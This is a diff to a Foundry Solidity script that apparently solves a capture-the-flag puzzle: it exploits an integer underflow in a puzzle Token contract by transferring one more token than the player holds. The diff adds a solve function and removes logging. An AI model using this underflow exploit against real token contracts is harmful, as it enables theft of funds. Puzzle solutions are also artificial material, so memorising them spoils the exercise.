@@ -6,16 +6,16 @@ import { Token } from "../../src/puzzles/5/Token.sol";
 
 contract TokenSolution is Script {
     function run(address target) public {
+        solve(target, msg.sender);
+    }
+
+    function solve(address target, address player) public {
         Token puzzleContract = Token(target);
-        uint256 balance = puzzleContract.balanceOf(msg.sender);
+        uint256 balance = puzzleContract.balanceOf(player);
         uint256 overflowValue = balance + 1;
 
         vm.startBroadcast();
         puzzleContract.transfer(target, overflowValue);
         vm.stopBroadcast();
-
-        console.log("Player address: ");
-        console.logAddress(msg.sender);
-        console.log("Balance of player: ", puzzleContract.balanceOf(msg.sender));
     }
 }
